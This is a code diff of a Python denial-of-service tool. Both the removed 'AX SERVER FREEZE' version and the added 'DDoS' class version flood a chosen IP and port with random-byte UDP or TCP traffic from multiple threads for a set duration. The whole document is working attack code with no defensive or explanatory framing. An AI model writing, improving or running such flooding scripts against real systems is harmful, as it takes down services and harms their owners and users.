@@ -1,79 +1,73 @@
-#!/usr/bin/env python3
-# Code by Khalid Mahmud
+#!/usr/bin/python3
+
 import argparse
-import random
 import socket
 import threading
+import random
 import time
 
-# Parse the arguments
-ap = argparse.ArgumentParser()
-ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
-ap.add_argument("-p", "--port", required=True, type=int, help="Port")
-ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
-ap.add_argument("-t", "--times", type=int, default=50000000, help="Packets per one connection")
-ap.add_argument("-th", "--threads", type=int, default=6, help="Threads")
-ap.add_argument("-d", "--duration", required=True, type=int, help="Duration of the attack in seconds")
-args = ap.parse_args()
+class DDoS:
+    def __init__(self, ip, port, duration):
+        self.target = ip
+        self.port = port
+        self.duration = duration
+        self.stop = False
 
-print("--> Created BY Team AX <--")
-print("#-- AX SERVER FREEZE --#")
-print("Super Fast And Accurate")
+    def attack(self):
+        print(f"[*] Starting attack on {self.target}:{self.port} for {self.duration} seconds...")
+        start_time = time.time()
+        while not self.stop:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.target, self.port))
+                s.sendto(random._urandom(2048), (self.target, self.port))
+                s.sendto(random._urandom(2048), (self.target, self.port))
+                s.sendto(random._urandom(2048), (self.target, self.port))
+                s.sendto(random._urandom(2048), (self.target, self.port))
+                s.sendto(random._urandom(2048), (self.target, self.port))
+                s.close()
+            except socket.error:
+                print(f"[*] Server is down! Exiting...")
+                break
+            except KeyboardInterrupt:
+                break
+            except Exception as e:
+                print(f"[*] Error: {str(e)}")
 
-ip = args.ip
-port = args.port
-times = args.times
-threads = args.threads
-duration = args.duration
-choice = args.choice
+            # Check if the duration has elapsed
+            if time.time() - start_time >= self.duration:
+                break
 
-# Flag to stop the threads
-stop_event = threading.Event()
+    def stop_attack(self):
+        self.stop = True
 
-def run():
-    data = random._urandom(1024)
-    i = random.choice(("[*]", "[!]", "[#]"))
-    while not stop_event.is_set():
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (str(ip), int(port))
-            for x in range(times):
-                s.sendto(data, addr)
-            print(f"\033[92m{i} ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
-        except:
-            print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")
+def parse_args():
+    parser = argparse.ArgumentParser(description="DDoS Attack Script")
+    parser.add_argument("--ip", dest="ip", required=True, help="Target IP address")
+    parser.add_argument("--port", dest="port", type=int, required=True, help="Target port number")
+    parser.add_argument("--times", dest="times", type=int, required=True, help="Number of times to attack")
+    parser.add_argument("--threads", dest="threads", type=int, required=True, help="Number of threads to use")
+    parser.add_argument("--duration", dest="duration", type=int, required=True, help="Duration of attack in seconds")
+    return parser.parse_args()
 
-def run2():
-    data = random._urandom(16)
-    i = random.choice(("[*]", "[!]", "[#]"))
-    while not stop_event.is_set():
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print(f"\033[92m{i} ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
-        except:
-            s.close()
-            print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")
+def main():
+    args = parse_args()
+    ip = args.ip
+    port = args.port
+    times = args.times
+    threads = args.threads
+    duration = args.duration
 
-threads_list = []
+    ddos_threads = []
 
-for y in range(threads):
-    if choice == 'y':
-        th = threading.Thread(target=run)
-    else:
-        th = threading.Thread(target=run2)
-    th.start()
-    threads_list.append(th)
+    for _ in range(threads):
+        ddos = DDoS(ip, port, duration)
+        ddos_thread = threading.Thread(target=ddos.attack)
+        ddos_threads.append(ddos_thread)
+        ddos_thread.start()
 
-# Stop the attack after the specified duration
-time.sleep(duration)
-stop_event.set()
+    for thread in ddos_threads:
+        thread.join()
 
-# Wait for all threads to finish
-for th in threads_list:
-    th.join()
-
-print("Attack Stopped.")
+if __name__ == "__main__":
+    main()
